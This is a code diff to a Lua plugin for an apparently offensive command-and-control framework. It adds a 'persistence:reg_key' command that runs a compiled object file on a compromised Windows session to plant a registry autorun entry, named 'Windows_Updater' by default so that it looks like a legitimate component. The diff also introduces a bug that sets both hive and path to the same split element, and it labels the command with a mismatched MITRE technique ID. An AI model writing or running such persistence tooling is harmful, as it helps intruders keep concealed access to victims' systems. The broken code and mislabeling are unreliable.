@@ -1,5 +1,10 @@
 local time = require("time")
 local strings = require("strings")
+
+local function bof_path(bof_name, arch)
+    return "persistence/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
+end
+
 local persistdefaults = {
     displayname = "WinSvc",
     regkeyname = "WinReg",
@@ -71,8 +76,8 @@ local function run_Registry_Key(cmd, args)
 
     local hive, path
     if registry_key ~= "" then
-        hive = registry_key:split("\\")[1]
-        path = registry_key:split("\\")[2]
+        hive = strings.split(registry_key,"\\")[1]
+        path = strings.split(registry_key,"\\")[1]
     end
 
     return reg_add(session, hive, path, regkeyname, "REG_SZ", command)
@@ -560,3 +565,18 @@ cmd_backdoorlnk:Flags():String("custom_file", "",
                                "custom_file which will be uploaded")
 cmd_backdoorlnk:Flags():Bool("use_malefic_as_custom_file", false,
                              "use_malefic_as_custom_file")
+
+-- registry_key
+local function run_regkey_autorun(cmd)
+    local reg_key_name = cmd:Flags():GetString("reg_key_name")
+    local packed_args = bof_pack("zz", reg_key_name,"self")
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("regkey", arch)
+    local result = bof(session, script_resource(bof_file), packed_args, true)
+    return result
+end
+
+local cmd_regkey = command("persistence:reg_key", run_regkey_autorun, "persistence by reg_key", "T1113")
+cmd_regkey:Flags():String("reg_key_name","Windows_Updater","reg_key")
+opsec("persistence:reg_key", 9.0)
